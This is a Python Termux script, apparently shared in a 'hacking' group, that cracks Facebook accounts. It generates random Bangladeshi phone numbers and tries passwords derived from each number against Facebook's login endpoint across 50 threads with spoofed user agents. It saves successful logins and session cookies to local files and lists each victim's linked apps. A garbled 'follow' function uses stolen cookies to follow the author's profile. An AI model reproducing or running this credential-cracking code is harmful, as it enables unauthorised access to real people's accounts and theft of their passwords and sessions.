#Gift By ASRAFUL ISLAM SAIFUL
#Group: SAIFUL TERMUX HALPING ZONE
# 2nd Group : SAIFUL SCRIPT AND ID GIFT ZONE
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸ¤–] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸ¤–] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system("clear")
jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mcreate by saiful vai...............')
jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mupdate done.............')
jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m FOLLOW MY FB ACCOUNT............')
os.system('xdg-open https://www.facebook.com/gangstter.ceo?mibextid=ZbWKwL')
logo =("""\033[0;92m
\x1b[1;91m  ███████╗ █████╗ ██╗███████╗██╗   ██╗██╗     
\x1b[0;34m  ██╔════╝██╔══██╗██║██╔════ ██║   ██║██║     
\033[1;32m  ███████╗███████║██║█████╗  ██║   ██║██║     
\x1b[0;34m  ╚════██║██╔══██║██║██╔══╝  ██║   ██║██║     
\x1b[1;91m  ███████║██║  ██║██║██║     ╚██████╔╝███████╗
\033[1;97m  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝      ╚═════╝ ╚══════╝                                                                                               
  
\033[1;37m╔\033[1;36mGST\033[1;37m═══════════════════\033[1;36mGST✯𝐓𝐄𝐀𝐌\033[1;37m═════════════════\033[1;36mGST\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mMD SAIFUL ISLAM	           \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mSAIFUL VAI (BLANK) 	           \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m SAIFUL-GST420                  \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mSR.SAIFUL VAI                \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m3.9.0                        \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mSAIFUL-HACKER420 	     \033[1;37m {\033[1;36mGST\033[1;37m}        \033[1;31m│
\033[1;37m╚\033[1;36mGST\033[1;37m══════\033[41m\033[1;37m[ 𓆩.GEST..𓆪 𓆩SYBER𓆪  𓆩.TEEM.𓆪 ]\x1b[0m══════\033[1;36mGST\033[1;37m╝

\033[93;1m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\033[93;1m❴\033[47m\033[1;30mSAIFUL VAI\033[40m\033[00m\033[93;1m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\033[93;1m● 
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m GST.....
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m SAIFUL VAI....
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m SAIFUL-GST....
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m ONLY REANDOM....
\033[93;1m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\033[93;1m❴\033[47m\033[1;30mSAIFUL VAI\033[40m\033[00m\033[93;1m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\033[93;1m●\n
    """) 
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=['Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13']
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)  
# APK CHECK
def hoga_check():
  uuid =  str(os.geteuid()) + str(os.getlogin()) 
  id = "SAIFUL-X-x0x0x" + "|".join(uuid)
  os.system("clear")
  print(logo)
  print("\033[38;5;46m  ❥▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃❦")
  print("\x1b[1;92m  ➠  𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐈𝐒\033[38;5;46m : "+id) 
  try: 
    httpCaht = requests.get("https://github.com/SAIFUL-HACKER420/aprooval.txt/blob/main/Aprooval.txt").text 
    if id in httpCaht: 
      print("\x1b[1;96m  ➠   𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐒𝐓𝐀𝐓𝐔𝐒: 𝐀𝐂𝐓𝐈𝐕𝐄  \033[97;1m  ✔ ") 
      msg = str(os.geteuid()) 
      time.sleep(0.3) 
      pass 
    else: 
      print("\x1b[38;5;248m  ➠  𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐈𝐒 𝐍𝐎𝐓 𝐀𝐂𝐓𝐈𝐕𝐄\33[97;1m ✘") 
      print("\x1b[38;5;208m  ➠  𝐂𝐎𝐏𝐘 𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐒𝐄𝐍𝐓 𝐀𝐔𝐓𝐇𝐎𝐑") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print(logo) 
     hoga_check()
hoga_check()	
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Example>: \033[38;5;45m019,\033[38;5;46m017,\033[38;5;195m018{x}')
    print(" \033[93;1m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\033[93;1m❴\033[47m\033[1;30mSAIFUL VAI\033[40m\033[00m\033[93;1m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\033[93;1m●\n")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    rk4 = '017'
    code = random.choice([rk1,rk2,rk3])                       #input(f' [{xr}â– {x}] Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m EXAMPLE : \033[38;5;195m10000, \033[38;5;45m20000, \033[38;5;46m50000  \n \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××\n \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m PUT CLONING LIMIT:\033[38;5;46m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        jalan('\x1b[1;92m▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃')
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m YOUR TOTAL IDS: \033[38;5;46m'+tl)
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m The process has been started')
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m mobile data + wifi on')
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m use airplane mode if ok ids not code')
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m SAIFUL ON FIRE')
        jalan('\x1b[1;92m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',  
	  	 "method": 'GET',
    	   "scheme": 'https',
   	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 	      'accept-language': 'en-ZA,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    	   'cache-control': 'max-age=0',
     	  'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
     	  'sec-ch-ua-mobile': '?1',
	       'sec-ch-ua-platform': '"Android"',
  	     'sec-fetch-dest': 'document',
      	 'sec-fetch-mode': 'navigate',
   	    'sec-fetch-site': 'none',
 	      'sec-fetch-user': '?1',
     	 'upgrade-insecure-requests': '1',
      	 'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r \033[38;5;196m[\033[38;5;45mSAIFUL-OK🔥\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m[\033[38;5;46mCOOKIE-🤖\033[38;5;45m] = \033[38;5;45m'+coki+  '  ''  \033[38;5;45m')
                cek_apk(session,coki)
                open('/sdcard/SAIFUL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
               # print('\x1b[1;92m[🔥] ' +uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m[\033[38;5;46mCOOKIE-🤖\033[38;5;45m] = \033[38;5;45m'+coki+  '  ''  \033[38;5;45m')
                 #cek_apk(session,coki)
                open('/sdcard/saiful-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} [{xr}SAIFUL{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        
        
        sys.stdout.flush()
    except:
        pass

xxr()